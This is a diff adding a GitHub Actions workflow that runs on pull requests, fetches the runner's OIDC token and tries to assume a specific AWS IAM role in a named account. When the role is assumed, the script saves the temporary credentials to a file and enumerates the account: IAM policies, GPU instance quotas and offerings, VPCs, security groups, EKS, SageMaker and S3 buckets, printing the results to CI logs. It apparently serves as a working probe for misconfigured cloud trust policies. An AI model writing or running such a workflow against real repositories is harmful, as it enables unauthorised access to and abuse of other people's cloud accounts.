@@ -1,0 +1,66 @@
+name: c211-i106370-oidc-probe
+on:
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: oidc-claims-and-assume
+        env:
+          ARNS: "arn:aws:iam::191798898985:role/fitness-assistant-github-actions-ci"
+        run: |
+          set -u
+          echo "EVENT=${GITHUB_EVENT_NAME}"
+          echo "REPO=${GITHUB_REPOSITORY}"
+          echo "REPO_ID=${GITHUB_REPOSITORY_ID}"
+          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          TOK=$(printf '%s' "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
+          echo "IDT_LEN=${#TOK}"
+          printf '%s' "$TOK" > /tmp/idt.txt
+          python3 - <<'PY'
+          import json, base64
+          t = open('/tmp/idt.txt').read().strip()
+          p = t.split('.')
+          if len(p) == 3:
+              pad = p[1] + '=' * (-len(p[1]) % 4)
+              d = json.loads(base64.urlsafe_b64decode(pad))
+              for k in ('sub','aud','event_name','repository','repository_id','repository_owner_id','ref','iss','environment'):
+                  print(str(k).upper() + '=' + str(d.get(k)))
+          else:
+              print('IDT_PARSE_FAIL')
+          PY
+          for ARN in $ARNS; do
+            echo "TRY $ARN"
+            if aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name "c211-i106370" --web-identity-token "$TOK" --duration-seconds 900 --region us-east-1 --output json > o.json 2> e.txt; then
+              echo "ASSUMED_OK $ARN"
+              python3 -c "import json,hashlib;d=json.load(open('o.json'))['Credentials'];ak=d['AccessKeyId'];print('AKID_SHA256_16='+hashlib.sha256(ak.encode()).hexdigest()[:16]);print('EXPIRATION='+str(d.get('Expiration')));open('creds.env','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n'%(d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))"
+              . ./creds.env
+              echo "GCI:"; aws sts get-caller-identity --output json 2>&1 | head -c 800; echo
+              for Q in L-DB2E81BA L-3819A6DF L-417A185B; do
+                echo "QUOTA $Q:"; aws service-quotas get-service-quota --service-code ec2 --quota-code "$Q" --region us-east-1 --output json 2>&1 | head -c 400; echo
+              done
+              echo "IAM_ATTACHED:"; aws iam list-attached-role-policies --role-name "$(echo "$ARN" | sed 's#.*role/##')" --output json 2>&1 | head -c 1200; echo
+              echo "IAM_INLINE:"; aws iam list-role-policies --role-name "$(echo "$ARN" | sed 's#.*role/##')" --output json 2>&1 | head -c 800; echo
+              for IT in g4dn.xlarge g5.xlarge g6.xlarge p3.2xlarge p5.48xlarge; do
+                echo -n "OFFERING $IT "; aws ec2 describe-instance-type-offerings --location-type availability-zone --filters "Name=instance-type,Values=$IT" --region us-east-1 --output json 2>&1 | head -c 400; echo
+              done
+              echo "EC2_VPCS:"; aws ec2 describe-vpcs --region us-east-1 --output json 2>&1 | head -c 700; echo
+              echo "EC2_SUBNETS:"; aws ec2 describe-subnets --region us-east-1 --max-items 5 --output json 2>&1 | head -c 1200; echo
+              echo "EC2_SG:"; aws ec2 describe-security-groups --region us-east-1 --max-items 5 --output json 2>&1 | head -c 900; echo
+              echo "EC2_CAPRES:"; aws ec2 describe-capacity-reservations --region us-east-1 --output json 2>&1 | head -c 500; echo
+              echo "EKS:"; aws eks list-clusters --region us-east-1 --output json 2>&1 | head -c 400; echo
+              echo "SAGEMAKER:"; aws sagemaker list-endpoints --region us-east-1 --output json 2>&1 | head -c 500; echo
+              echo "S3:"; aws s3api list-buckets --output json 2>&1 | head -c 900; echo
+              unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+            else
+              echo "ASSUME_FAIL $ARN"
+              head -c 900 e.txt; echo
+            fi
+          done
+          echo "C211_PROBE_DONE"
